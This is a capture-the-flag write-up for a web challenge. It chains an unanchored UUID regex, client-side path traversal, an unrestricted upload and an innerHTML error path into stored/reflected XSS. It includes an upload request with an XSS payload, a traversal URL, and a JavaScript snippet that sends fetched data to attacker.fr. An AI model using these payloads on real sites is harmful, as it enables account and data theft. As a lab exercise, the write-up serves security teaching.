# Comeback

## Challenge

>   Your company's support site has a new look! A brand-new interface is available, and we hope it will make tracking your tickets even faster!
>
>   Author : `Elweth` 

- Category: Web
- Difficulty: Medium

## Deployment

- Docker compose

```bash
cd src; docker compose up
``` 

## Writeup

*This challenge is inspired by a real case found in a bug bounty program.*

The application lets you create an account/log in to send tickets to support.

To do this, users create a ticket by entering a title, description and image.

At first glance, no XSS or SSTI is possible. The upload form is very permissive, but the files are automatically downloaded and are not interpeted in the browser, which is quite limiting.

When a request is created, the URL to access it looks like this:

- http://localhost:5004/demande?id=72b054cb-8704-483b-a8e9-a290da5c1439

Each request is represented by a unique v4 UUID, and it is not possible to access other users' notes.

### File upload : Unrestricted && broken access control

The application allows users to send files, with no control over file type.

What's more, by creating 2 different accounts, it turns out that, provided the UUID is known, user A can access files uploaded by user B ... which isn't exactly secure, but it's impossible to predict the UUID.

We'll keep this to one side 

### Regex bypass

When a request is made, Javascript takes care of retrieving the GET parameter from the URL and sending it to the API to retrieve the data.

Here is the JS file :

```javascript
document.addEventListener('DOMContentLoaded', function() {
    const params = new URLSearchParams(window.location.search);
    const id = params.get('id');
    const requestDetails = document.getElementById('requestDetails');

    function isValidUUID(uuid) {
        const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}/i;
        return uuidRegex.test(uuid);
    }
    
    if ( id && isValidUUID(id)) {
        fetch(`/api/demande/${id}`)
            .then(response => response.text())
            .then(text => {
                try {
                    const parsed = JSON.parse(text);

                    requestDetails.innerHTML = '';

                    if (parsed.title) {
                        const titleElement = document.createElement('h2');
                        titleElement.textContent = 'Title: '+ parsed.title;
                        titleElement.classList.add('mb-3');

                        const descriptionElement = document.createElement('p');
                        descriptionElement.textContent = 'Description: '+ parsed.description;
                        descriptionElement.classList.add('mb-4');

                        requestDetails.appendChild(titleElement);
                        requestDetails.appendChild(descriptionElement);

                        if (parsed.file_uuid) {
                            const downloadLink = document.createElement('a');
                            downloadLink.href = `/api/files/${parsed.file_uuid}`;
                            downloadLink.className = 'btn btn-info';
                            downloadLink.textContent = 'Download File';
                            downloadLink.classList.add('d-block', 'mt-3');
                            requestDetails.appendChild(downloadLink);
                        }
                    } else {
                        requestDetails.innerHTML = '<p class="text-danger">Request not found.</p>';
                    }
                } catch (error) {
                    requestDetails.innerHTML = `<p class="text-danger">Error parsing JSON: ${text} -> ${error.message}</p>`;
                }
            })
            .catch(error => {
                requestDetails.innerHTML = `<p class="text-danger">Error fetching data: ${error.message}</p>`;
            });
    } else {
        requestDetails.innerHTML = '<p class="text-danger">Request ID is missing or is not valid UUID.</p>';
    }
});
```

The API first checks that the ID passed as a GET parameter is indeed a UUID, to do that a regex is used.

Here is the regex :

```javascript
const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}/i;
``` 

The regex looks good for matching a UUID and indeed it works correctly. However, it is too permissive because it does not have the end character: `$`.

Thanks to this, the regex only checks if the ID starts with a UUID, but not what comes after it.

For example : `/demande?id=72b054cb-8704-483b-a8e9-a290da5c1439foobarfoobarfoobarfoobarfoobar` is considered as valid for the regex.

### Client side path traversal

Thanks to this lack of control over the regex, it is possible to make a “Client Side Path Traversal”.

If the UUID is correct (or the regex can be bypassed), it is sent to the API, concatenated at the end of the URL as follows:
```javascript
fetch(`/api/demande/${id}`)
```
In this way, we can force the browser to fetch the URL of our choice like this:
```javascript
fetch(`/api/demande/72b054cb-8704-483b-a8e9-a290da5c1439/../../../../../../../foo/bar`) // -> will fetch /foo/bar
```

### Reflected XSS

Since we can force the server to request the endpoint of our choice, we can now use file upload to display the data of our choice.

As the following code snippet shows, once the fetch request has been made, the JS attempts to parse it into JSON.

If the parsing fails, then an error is displayed to the user via an innerHTML :D It's starting to smell good :

```javascript
try {
    const parsed = JSON.parse(text);
    ...
} catch (error) {
    requestDetails.innerHTML = `<p class="text-danger">Error parsing JSON: ${text} -> ${error.message}</p>`;
}
```

So we're going to use the CSPT to fetch a file we've uploaded containing our XSS.

We submit the support request by specifying an XSS in the file uploaded:

```bash
POST /api/requests HTTP/1.1
Host: 127.0.0.1:5004
Content-Length: 408
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5SGbbf1UClVY63uQ
Cookie: access_token=XX
Connection: keep-alive

------WebKitFormBoundary5SGbbf1UClVY63uQ
Content-Disposition: form-data; name="title"

bb
------WebKitFormBoundary5SGbbf1UClVY63uQ
Content-Disposition: form-data; name="description"

bb
------WebKitFormBoundary5SGbbf1UClVY63uQ
Content-Disposition: form-data; name="file"; filename="chaton.jpeg"
Content-Type: image/jpeg

<img src=x onerror="alert()">
------WebKitFormBoundary5SGbbf1UClVY63uQ--
```

Once the request has been saved, we retrieve the path containing the file's UUID, in my case: /api/files/5b7efe29-3bf2-4346-ac63-c9c5a4ab97ca.

Then CSPT on it:

- http://192.168.117.136:5004/demande?id=72b054cb-8704-483b-a8e9-a290da5c1439/../../../../../../../api/files/5b7efe29-3bf2-4346-ac63-c9c5a4ab97ca

Bingo, XSS!

![XSS Comeback](/images/xss_comeback.png)

### Flag exfiltration

To get the flag back, the challenge isn't quite over yet! The bot has no cookies.

To retrieve the precious flag, you need to retrieve the requests submitted by the bot. This can be done with the following script:

```javascript
fetch("/api/demandes").then(d => d.text()).then((data) => {
    demande = data;
    window.location.href = `https://attacker.fr/?exfil=${btoa(demande)}`;
})
```

We repeat the upload operation, send the link to the CSPT to the bot, and get the flag back!

```
GET /?exfil=W3siZGVzY3JpcHRpb24iOiJSTXtIb2x5X3NoMXRfMV9XNHNfU3VyZV9UMF9QcjN2ZW50X1hTU30iLCJmaWxlX3V1aWQiOm51bGwsImlkIjoiODljOGUzNjctYTA2YS00ZDYyLWFlNGItODMyY2Q1NmZiYjM4IiwidGl0bGUiOiJmbGFnIn1dCg==
```